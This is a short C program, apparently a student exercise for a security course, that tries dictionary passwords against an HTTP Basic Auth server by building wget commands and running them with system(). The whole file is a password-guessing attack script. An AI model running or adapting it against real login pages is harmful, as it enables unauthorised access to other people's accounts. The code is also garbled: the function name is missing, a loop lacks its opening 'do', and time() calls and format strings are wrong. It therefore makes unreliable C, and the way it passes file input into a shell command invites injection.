#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <ctype.h>
#include<sys/time.h>

int ()
{
  char first[80], last[50];
  int count =0;
  int Start_time,End_time,Total_time,average;
  char password[15], *getWord;
  getWord = " ";
  FILE *fp;
  int systemres = 1;
  fp = fopen("words", "r");
  Start_time = time();
  strcpy(first, "wget --http-user= --http-passwd=");
  strcpy(last, " http://sec-crack.cs.rmit.edu./SEC/2/");

  {
    getWord = fgets(password, 15, fp);
    if (getWord == NULL) exit(1);
    password [ strlen(password) - 1 ] = '\0';
    if(strlen(password) == 3)
    {
    strcat(first, password);
    strcat(first, last);
    printf("The length of the word is : %d", strlen(password));
    printf("\n %s \n",first);
    count++;
    systemres = system(first);
    if (systemres == 0)
    {
		printf(" Time =%11dms\n", Start_time);
		End_time = time();
		Total_time = (End_time - Start_time);
		Total_time /= 1000000000.0;
		printf("totaltime in seconds =%lldsec\n", Total_time);
		printf("Total  of attempts %d", count);
		printf("\nsuccess %d %s\n",systemres,password);

       printf("\nsuccess %d %s\n",systemres,password);
       exit(1);
    }
    strcpy(first, "");
    strcpy(first, "wget --http-user= --http-passwd=");
    printf("%s", password);
  }
 }
while(getWord != NULL);

}
